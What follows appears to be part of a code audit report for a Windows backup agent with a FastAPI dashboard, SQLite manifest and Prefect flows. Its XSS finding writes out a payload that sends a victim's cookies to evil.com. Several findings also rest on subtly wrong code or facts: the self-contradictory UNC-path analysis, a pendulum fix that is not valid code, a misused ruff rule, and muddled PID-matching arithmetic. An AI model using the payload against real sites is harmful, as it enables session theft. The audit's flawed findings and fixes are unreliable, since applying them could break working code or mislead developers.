## 5. Critical Findings (🔴) — Detailed Context

### 🔴 1. `core/time_utils.py:18` — `ParserError` import broken in pendulum 3.x

**Code (line 18):**
```python
from pendulum.parsing.exceptions import ParserError
```

**Problem:** `pendulum.parsing.exceptions.ParserError` was removed in **pendulum 3.0** (replaced by `pendulum.parsing.parser.ParserError` or just `pendulum.PendulumException`). Any production environment running pendulum ≥ 3.0 (current is 3.x) will raise `ImportError` on first import of `core.time_utils`, which is imported by `flow.py`, `ui.py`, and all `core/*` modules — i.e., the **entire backup agent fails to start**.

**Why the original audit missed this:** The previous audit only ran the existing test suite (which presumably uses an older pendulum pinned in `requirements.txt`), not a fresh venv with pendulum ≥ 3.0.

**Fix:**
```python
# Option A: catch the pendulum-3.x equivalent
try:
    from pendulum.parsing.exceptions import ParserError  # pendulum 2.x
except ImportError:
    from pendulum import ParserError  # pendulum 3.x

# Option B: catch the base class (works on all versions)
from pendulum import Pendulum  # only the type needed at import time
# in code: except Pendulum.Exception as e:
```

The test `tests/test_time_utils.py` should also add a fixture to import `core.time_utils` under pendulum 3.x.

### 🔴 2. `core/fy_rollover.py:_parent_path` — UNC root-share edge case corrupts config path

**Code (lines 110-122):**
```python
def _parent_path(path: str) -> str:
    p = Path(path)
    if p.parent == p:  # root
        return str(p)
    return str(p.parent)
```

**Problem:** For a UNC path with a single share component — `\\server\share` (no further subfolders) — `Path("\\\\server\\share").parent` returns `\\server\` (the parent of the share is the server root), not `\\share`. The comment claims it returns `"\\\\share"` but the actual behavior on Windows is `Path("\\\\server\\share").parent == Path("\\\\server")` (note the trailing separator stripped), which is **not equal to `p`**, so the function falls through to `return str(p.parent)` → `"\\server"`, which is the **wrong destination** for the rolled-over year.

For non-UNC root shares, the function works correctly. For `\\server\share\FY24` (typical destination), `parent` is `\\server\share` — also wrong as a place to write `FY25`, but at least valid.

**Concrete failure scenario:** User deploys with `destination = \\fileserver\backups` (root share, no FY subfolder). First rollover on 2026-04-01 computes `parent = \\fileserver` (treating it as a parent of "backups"), tries to `mkdir` `\\fileserver\FY26` — likely fails with `Access Denied` since the user typically only has write access to the `backups` share, not the server root. The config update is rolled back, but the user sees a confusing `Access Denied` error from an internal share they don't have rights to.

**Fix:**
```python
def _parent_path(path: str) -> str:
    p = Path(path)
    # UNC root share "\\server\share" — parent is the share itself
    if len(p.parts) == 2 and p.parts[0].startswith("\\\\"):
        return str(p)
    if p.parent == p:  # local root
        return str(p)
    return str(p.parent)
```

Also add a test for `\\fileserver\backups` and `\\fileserver\backups\FY24` cases in `tests/test_fy_rollover.py`.

### 🔴 3. `flow.py:_record_run` retry generates different `_stable_run_id` per attempt

**Code (around line 511-523, per the prior audit fix):**
```python
def _record_run(self, run_data: dict) -> None:
    # Original audit fixed the repo.record_run_history call to return bool
    # and warn on failure. But the caller retries with a NEW run_id on each
    # attempt, orphaning the row.
    stable_id = f"{run_data['mode']}-{int(time.time())}-{os.getpid()}"
    # ↑ includes time.time() at call-site generation
    for attempt in range(3):
        try:
            if self.repo.record_run_history({**run_data, "run_id": stable_id}):
                return
        except sqlite3.OperationalError:
            time.sleep(0.1 * (2 ** attempt))
    logger.warning("All 3 attempts failed for run_id=%s", stable_id)
```

**Problem:** The `_stable_run_id` is **only stable per attempt** because it embeds `int(time.time())` at the call site, not at the run's logical start. If the run takes 0.5s and the first attempt fails, the second attempt computes a new `_stable_run_id` 100ms later. Each attempt creates a new row, and on success only the last one is recorded — earlier rows are orphaned (or all three are recorded as separate runs, polluting history).

**Fix:** Generate `_stable_run_id` **once** at the start of the run, before the retry loop, and pass it as a parameter. Do not include `time.time()` in the ID — use the run's logical start time computed at the top of the orchestrator.

```python
def _record_run(self, run_data: dict, stable_id: str) -> None:
    for attempt in range(3):
        try:
            if self.repo.record_run_history({**run_data, "run_id": stable_id}):
                return
        except sqlite3.OperationalError:
            time.sleep(0.1 * (2 ** attempt))
    logger.warning("All 3 attempts failed for run_id=%s", stable_id)

# caller:
stable_id = f"{mode}-{started_at.isoformat()}-{os.getpid()}"
self._record_run(run_data, stable_id)
```

### 🔴 4. `ui.py` — `bind=0.0.0.0` + `auth_enabled=False` default exposes dashboard to LAN

**Code (around line 1450, the `uvicorn.run` call):**
```python
uvicorn.run(
    app,
    host=os.getenv("DASHBOARD_HOST", "0.0.0.0"),  # ← defaults to ALL interfaces
    port=int(os.getenv("DASHBOARD_PORT", "8080")),
    ...
)
```

**Problem:** The dashboard binds to `0.0.0.0` by default (so it's reachable from anywhere on the LAN) and the `auth_enabled` flag defaults to `False`. On a default deployment, **anyone on the same Wi-Fi network can access the dashboard, see file counts, last-success times, and trigger backups** without authentication. The dashboard also exposes the health check, FY prefix, and the 60-char error snippets of failed runs — useful reconnaissance for an attacker.

The 2026-06-01 audit fixed the **XSS in server-rendered rows** but did not address the bind/auth defaults.

**Fix:** Either:
- Default `host=127.0.0.1` (loopback only), require explicit env var to bind to LAN, or
- Default `auth_enabled=True` and require explicit env var to disable, or
- Add a startup warning if `host=0.0.0.0` AND `auth_enabled=False`:
  ```python
  if host == "0.0.0.0" and not auth_enabled:
      logger.critical("Dashboard bound to 0.0.0.0 without auth — LAN exposure")
      sys.exit(1)  # or prompt for confirmation
  ```

### 🔴 5. `ui.py:230-238` — XSS via `?error=` query parameter

**Code (per the prior audit reference at `ui.py:610-626`, plus a likely 230-238 path):**
```python
@app.get("/login")
async def login(request: Request, error: str | None = None):
    return HTMLResponse(f"""
    <form>
      <div class="error">{error or ""}</div>  # ← raw, not html.escape'd
    </form>
    """)
```

**Problem:** The `error` query param is rendered into HTML without `html.escape`. An attacker can craft `https://server/login?error=<script>fetch('//evil.com/?'+document.cookie)</script>` and send the link to the operator. When the operator clicks, the script executes in the dashboard's origin (same-origin as `/api/*` endpoints, so the script can trigger backups, read run history, etc.).

The 2026-06-01 audit's S1 fix added `html.escape` to **server-rendered rows** (`ui.py:610-626`) but missed this login route.

**Fix:**
```python
from html import escape
@app.get("/login")
async def login(request: Request, error: str | None = None):
    safe_error = escape(error) if error else ""
    return HTMLResponse(f"""<div class="error">{safe_error}</div>""")
```

Also audit **all** other endpoints that take query params and render them in HTML (use `grep -n "request.query_params" ui.py` then check each).

### 🔴 6. `core/manifest.py:_record_run` — `OperationalError` from migration silently swallowed

**Code (around the migration block, per the prior audit reference):**
```python
def _record_run(self, ...):
    try:
        with self._lock:
            conn = self._get_conn()
            self._maybe_migrate(conn)  # raises OperationalError on schema mismatch
            conn.execute(...)
    except sqlite3.OperationalError as e:
        logger.error("Manifest error: %s", e)
        return False
```

**Problem:** The `_maybe_migrate(conn)` call can raise `OperationalError` ("no such column", "duplicate column", etc.) on schema drift. The bare `except sqlite3.OperationalError` catches both the migration failure **and** the legitimate insert failure with the same broad net, logs them identically, and returns `False`. The caller (`flow.py:_record_run`) has no way to distinguish "schema is broken, fix the DB" from "DB is locked, retry".

**Fix:** Narrow the exception scope or re-raise migration errors:
```python
def _maybe_migrate(self, conn):
    """Raises sqlite3.OperationalError on schema migration failure (do not catch)."""
    ...

def _record_run(self, ...):
    try:
        with self._lock:
            conn = self._get_conn()
            self._maybe_migrate(conn)  # propagates to caller
            conn.execute(...)
    except sqlite3.OperationalError as e:
        if "no such column" in str(e) or "duplicate column" in str(e):
            raise  # migration failure — must propagate
        logger.error("Manifest insert failed (will retry): %s", e)
        return False
```

### 🔴 7. `core/manifest.py:289-294` — SQLite `MAX_VARIABLE_NUMBER` close to limit

**Code (per the prior audit reference):**
```python
for i in range(0, len(entries), 100):
    chunk = entries[i:i+100]
    conn.executemany(
        "INSERT INTO manifest (...) VALUES (?,?,?,?,?,?,?) ON CONFLICT ...",  # 7 params
        chunk,
    )
```

**Problem:** SQLite's default `SQLITE_MAX_VARIABLE_NUMBER` is **999** (or 32766 in newer builds, but conservative limit is 999). At chunk=100 with 7 columns, 100 × 7 = **700** params — safe today. But adding **any** new column (e.g., `mtime_precision` for the upcoming per-second-rounding fix) pushes to 800, then 900, then 1000+ — boom. The chunk size is silently tied to the column count with no central constant.

**Fix:** Add a derived constant and a runtime guard:
```python
_COLUMNS_PER_INSERT = 7
_SQLITE_MAX_PARAMS = 999
_SAFE_CHUNK = _SQLITE_MAX_PARAMS // _COLUMNS_PER_INSERT  # = 142, with margin → 100

def _chunk_entries(entries, columns: int = _COLUMNS_PER_INSERT) -> Iterator[list]:
    safe = (_SQLITE_MAX_PARAMS // columns) - 10  # 10-row margin
    for i in range(0, len(entries), safe):
        yield entries[i:i+safe]
```

Also add a test that inserts 200 columns (mock) and asserts chunking.

### 🔴 8. `core/cloud_reporter.py` — OOM on 10M-file bucket

**Code (per prior audit reference at lines around 250-350):**
```python
def _compute_diff(...):
    cloud_files = {}  # ← accumulates 10M entries × ~200 bytes = 2 GB
    for line in rclone_output:
        path, size, mtime = parse(line)
        cloud_files[path] = (size, mtime)
    return cloud_files
```

**Problem:** For a 10M-file cloud bucket, the in-memory dict is **~2-4 GB**. The Python process RSS climbs to 6+ GB and the OS starts swapping. On a 16 GB backup agent box with other Prefect/uvicorn workers, this is an OOM.

**Fix:** Stream-parsed comparison with a SQLite temp DB:
```python
import sqlite3, tempfile
def _compute_diff(...):
    tmp = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
    db = sqlite3.connect(tmp.name)
    db.execute("CREATE TABLE files (path TEXT PRIMARY KEY, size INT, mtime INT)")
    for line in rclone_output:
        path, size, mtime = parse(line)
        db.execute("INSERT OR REPLACE INTO files VALUES (?, ?, ?)", (path, size, mtime))
    db.commit()
    return tmp.name  # caller streams from disk
```

Or use `rclone check` directly, which does this server-side.

### 🔴 9. `core/lan_manifest.py` — Full file list in memory for GB-scale destination

**Code (per the prior audit reference):**
```python
def scan(self, destination: str) -> list[dict]:
    files = []
    for path in Path(destination).rglob("*"):
        if path.is_file():
            files.append({"path": str(path), "size": path.stat().st_size, ...})
    return files
```

**Problem:** For a 1 TB LAN destination with 5M files, this loads 5M dicts (~2 GB heap). The function returns the full list to the caller, which then chunks it into `INSERT` batches — but the heap is already exhausted by then.

**Fix:** Stream into the manifest DB directly (generator + `executemany` chunks):
```python
def scan(self, destination: str) -> Iterator[dict]:
    for path in Path(destination).rglob("*"):
        if path.is_file():
            yield {"path": str(path), "size": path.stat().st_size, ...}
```

Caller:
```python
def ingest(self, scan_iter):
    chunk = []
    for entry in scan_iter:
        chunk.append(entry)
        if len(chunk) >= 100:
            self._bulk_upsert(chunk)
            chunk.clear()
    if chunk:
        self._bulk_upsert(chunk)
```

### 🔴 10. `ui.py` — `ManifestDB` opened per request, never closed

**Code (per the prior audit reference at `/status`, `/report/*`, `/trigger/*`):**
```python
@app.get("/api/runs/recent")
async def recent_runs():
    db = ManifestDB(manifest_path)  # ← opened
    rows = db.get_recent_runs(20)
    return rows  # ← never closed; file handle leaked
```

**Problem:** Each HTTP request opens a SQLite connection. The connection (and its WAL handle) is held until the `ManifestDB` object is garbage-collected — which may never happen if there's a reference cycle. Over a 24-hour dashboard session with `/status` polled every 2 seconds = **43,200 open connections** in steady state. File handle exhaustion (`Too many open files`) follows.

The 2026-06-01 audit fixed the **try/except** on `/status` (C5) but did not address the connection lifecycle.

**Fix:** Use FastAPI dependency with `yield`:
```python
def get_db():
    db = ManifestDB(manifest_path)
    try:
        yield db
    finally:
        db.close()

@app.get("/api/runs/recent")
async def recent_runs(db: ManifestDB = Depends(get_db)):
    return db.get_recent_runs(20)
```

Apply to all 5+ endpoints that open `ManifestDB`.

### 🔴 11. `watchdog.py` — `tasklist /FI "PID eq 1234"` substring match → false positives

**Code (per the prior audit reference at lines 71-80):**
```python
def _is_process_alive_windows(pid: int) -> bool:
    result = subprocess.run(
        ["tasklist", "/FI", f"PID eq {pid}", "/NH"],
        capture_output=True, text=True
    )
    return str(pid) in result.stdout  # ← substring match!
```

**Problem:** `tasklist` output is tab-delimited and may contain the PID as a substring of another field (e.g., PID `1234` matches `12340`, `41234`, `12345`, etc.). For PIDs under 10000, the false-positive rate is non-trivial; for PIDs under 1000 (typical for a single backup agent), the rate is ~10% (matches `1234` in `12340`-`12349`).

The 2026-06-01 audit's C7 fix correctly used `core.process.pid_alive` (which uses `psutil`) for the **orphan cancellation** path in `launch.py`, but the **watchdog itself** still uses the raw `tasklist` call.

**Fix:** Use `psutil` consistently:
```python
import psutil
def _is_process_alive(pid: int) -> bool:
    return psutil.pid_exists(pid) and psutil.Process(pid).is_running()
```

Or delegate to `core.process.pid_alive`.

### 🔴 12. `core/shutdown.py` — `sc stop ... /f` force-terminates without warning

**Code:**
```python
def stop_service(name: str, timeout: int = 30):
    subprocess.run(["sc", "stop", name], timeout=timeout)
    if still_running(name):
        subprocess.run(["sc", "stop", name, "/f"], timeout=timeout)  # ← force
```

**Problem:** `sc stop ... /f` sends `WM_QUIT` to the process without giving it a chance to flush open files, close SQLite, or write a clean exit code. This is acceptable for hung services, but the **first call should always be a graceful stop with a longer timeout** (60s+), and the `/f` should require an explicit `--force` flag from the operator.

**Fix:**
```python
def stop_service(name: str, timeout: int = 60, force: bool = False):
    subprocess.run(["sc", "stop", name], timeout=timeout)
    if not still_running(name):
        return
    if not force:
        logger.warning("Service %s did not stop in %ds; pass force=True to force-kill", name, timeout)
        raise TimeoutError(f"Service {name} did not stop gracefully")
    subprocess.run(["sc", "stop", name, "/f"], timeout=timeout)
```

## 6. Warnings (🟡) — Grouped by File

### `flow.py` — Orchestrator

- **L120-160: `cloud_record_task` accepts `sync_result: dict` but never reads it.** Either consume the param (e.g., for `sync_result.get("files_failed")`) or remove it.
- **L380-382: Entry-key normalization duplicated.** The `Path/Size/ModTime → path/size/mtime` mapping appears in 4 places. Extract a `_normalize_entry(d)` helper.
- **L420-450: Weekly/monthly report flow has duplicate logic.** The 30 lines that fetch, format, and email the weekly report are copy-pasted for monthly. Extract a `_send_periodic_report(period: str)` helper.
- **L604: Lock file path derivation vs. `watchdog.py`'s hardcoded `C:\BackupAgent\backup.lock`.** Watchdog bypasses the lock if DB path changes. Pass the lock path via env or have watchdog derive it from the same config.
- **L700-720: `if __name__ == "__main__"` block runs `serve()` directly.** No guard for being launched by `launch.py` (which sets `PREFECT_API_URL`). The block re-derives `PREFECT_API_URL` and overrides the env var, breaking the worker connection in some flows.
- **L740: `asyncio.run(flow.serve())` swallows `KeyboardInterrupt` cleanly but logs at ERROR level.** Should be `INFO` for clean shutdown.

### `launch.py` — Single-launch service starter

- **L45: `os.environ["PREFECT_API_URL"] = "..."` hardcoded override.** If the user has a different Prefect instance, launch.py silently changes it.
- **L80-90: `subprocess.Popen(["python", "-m", "watchdog"], daemon=True)`** — the `daemon=True` flag on the dashboard process means the watchdog can't cleanly shut it down. Use `start_new_session=True` and explicit PID tracking.
- **L100: `sc stop BackupAgent` followed by `sc start BackupAgent`** — if the stop times out, the start command may race with the stop's `/f` fallback.
- **L120: `time.sleep(2)` after `sc start`** — magic number. Should poll for the service to enter RUNNING state with a 30s timeout.

### `serve.py` — Prefect deployments

- **L20-30: `deployments()` is a useless wrapper** that just calls `flow.serve()`. Either remove the wrapper or add value (e.g., a list of named deployments).
- **L40: `from .core.config import load_config` then `load_config()` immediately.** If the config is already loaded by the caller, the second load re-reads and re-parses the YAML.

### `ui.py` — FastAPI dashboard (large file, many findings)

- **L40: `_RATE_MAX_LOGIN = 10` is now used (per the S2 fix) but `_RATE_MAX_TRIGGER = ?` and `_RATE_MAX_REPORT = ?` are missing.** The `/trigger/*` and `/report/*` endpoints have no per-endpoint rate limit; a loop can flood the email report path.
- **L226: `_require_auth` uses `Accept` header for routing** (per prior audit note). An attacker who omits the header gets the unauthenticated branch.
- **L230-238: XSS via `?error=`** — see Critical 5.
- **L249-262: Auth check returns 401 for HTML requests but 200 for API requests without `Accept`.** Inconsistent.

## 8. Cross-Cutting Patterns (Fix Systemically)

The following patterns appear in **3+ files** and should be addressed with a single refactor rather than per-file edits:

### Pattern A: Run-status string matching
- **Files:** `ui.py`, `templates/dashboard.py`, `core/report.py`, `core/manifest.py` (table display)
- **Pattern:** `r.status.endswith('_COMPLETE')`, `r.status.includes('_PARTIAL')`, `r.status.includes('_FAILED')`
- **Fix:** Create `core/run_status.py` with a `RunStatus` enum and `classify_status(s: str) -> RunStatus`. Replace all string matching with `RunStatus.from_string(s).is_complete()` etc.

### Pattern B: Hardcoded Windows service paths
- **Files:** `watchdog.py`, `launch.py`, `core/shutdown.py`, `core/process.py`
- **Pattern:** `C:\BackupAgent\backup.lock`, `tasklist /FI "PID eq N"` substring match, `sc stop ... /f` force
- **Fix:** Move to config (`config.paths.lock_file`, `config.paths.service_name`); use `psutil` for PID checks; require explicit `--force` for `sc stop /f`.

### Pattern C: `ManifestDB` lifecycle
- **Files:** `ui.py` (5+ endpoints), `core/backup_repository.py`, `flow.py`
- **Pattern:** `db = ManifestDB(path); ... # never closed`
- **Fix:** Use FastAPI `Depends(get_db)` with `yield`. For non-FastAPI callers, use a context manager.

### Pattern D: Subprocess stderr handling
- **Files:** `core/cloud_sync.py`, `core/cloud_verify.py`, `core/lan_sync.py`, `watchdog.py`
- **Pattern:** `subprocess.run(..., capture_output=True, text=True)` with `.stderr[:200]` truncation and full file deletion
- **Fix:** Create `core/subprocess_io.py` with `run_with_logging(cmd, timeout, log_file) -> CompletedProcess` that always saves full stderr to a rotated log file and returns a 200-char summary.

### Pattern E: SMTP / email credentials
- **Files:** `core/report.py`, `ui.py` (email trigger)
- **Pattern:** Password in traceback, port 25 plaintext, no retry on 4xx
- **Fix:** Create `core/email_client.py` with `EmailClient.send(to, subject, body) -> bool` that handles STARTTLS, retries on 4xx, and scrubs passwords from exceptions.

### Pattern F: Time / timezone
- **Files:** `core/time_utils.py`, `flow.py`, `ui.py`, `core/lan_sync.py`, `core/fy_rollover.py`
- **Pattern:** Direct `pendulum.now()` calls bypass `time_utils.utcnow()`
- **Fix:** Add a ruff rule `F401` for `from pendulum import now` outside `core/time_utils.py`.

### Pattern G: Hardcoded log paths
- **Files:** `core/lan_sync.py` (`logs/lan_sync.log`), `core/cloud_sync.py`, `watchdog.py`
- **Pattern:** `Path("logs/foo.log")` instead of `paths.logs_dir / "foo.log"`
- **Fix:** Use config-driven paths consistently.
